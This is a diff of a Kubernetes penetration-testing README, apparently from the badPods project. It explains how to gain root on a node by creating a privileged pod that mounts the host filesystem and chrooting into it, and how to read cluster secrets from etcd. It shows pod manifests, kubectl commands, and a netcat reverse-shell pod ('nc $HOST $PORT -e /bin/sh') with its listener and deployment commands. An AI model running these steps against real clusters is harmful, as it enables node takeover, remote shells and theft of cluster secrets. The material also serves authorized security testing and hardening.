@@ -1,4 +1,4 @@
-# You can create a pod with all the things
+# Bad Pod #1 - Everything allowed: You can create a pod with all the things
 
 The pod you create mounts the host’s filesystem to the pod. You’ll have the best luck if you can schedule your pod on a control-plane node using the nodeName selector in your manifest. You then exec into your pod and chroot to the directory where you mounted the host’s filesystem. You now have root on the node running your pod. 
 * **Read secrets from etcd** – If you can run your pod on a control-plane node using the nodeName selector in the pod spec, you might have easy access to the etcd database, which contains all of the configuration for the cluster, including all secrets. 
@@ -8,92 +8,29 @@ The pod you create mounts the host’s filesystem to the pod. You’ll have the 
 # Pod Creation
 
 ## Create a pod you can exec into
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: everything-allowed
-  labels:
-    app: pentest
-spec:
-  hostNetwork: true
-  hostPID: true
-  hostIPC: true
-  containers:
-  - name: everything-allowed
-    image: ubuntu
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - mountPath: /host
-      name: noderoot
-    command: [ "/bin/sh", "-c", "--" ]
-    args: [ "while true; do sleep 30; done;" ]
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
-  volumes:
-  - name: noderoot
-    hostPath:
-      path: /
-```
-[everything-allowed.yaml](everything-allowed.yaml)
-
-#### Option 1: Create pod from local yaml 
+Create pod from github hosted yaml
 ```bash
-kubectl apply -f everything-allowed.yaml 
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/everything-allowed.yaml 
 ```
-
-#### Option 2: Create pod from github hosted yaml
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/everything-allowed/everything-allowed.yaml 
-```
-
-#### Exec into pod 
+Exec into pod 
 ```bash
 kubectl exec -it everything-allowed -- chroot /host
 ```
 
-## Or, create a reverse shell pod
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: everything-allowed-revshell
-  labels:
-    app: pentest
-spec:
-  hostNetwork: true
-  hostPID: true
-  hostIPC: true
-  containers:
-  - name: everything-allowed-revshell
-    image: busybox
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - mountPath: /host
-      name: noderoot
-    command: [ "/bin/sh", "-c", "--" ]
-    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
-  volumes:
-  - name: noderoot
-    hostPath:
-      path: /
-```
-[everything-allowed-revshell.yaml](everything-allowed-revshell.yaml)
+## Reverse shell pod
 
-#### Set up listener
+Set up listener
 ```bash
 nc -nvlp 3116
 ```
 
-#### Create the pod
+Create the pod
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
 HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/everything-allowed-revshell.yaml | kubectl apply -f -
 ```
 
-#### Catch the shell and chroot to /host 
+Catch the shell and chroot to /host 
 ```bash
 ~ nc -nvlp 3116
 Listening on 0.0.0.0 3116
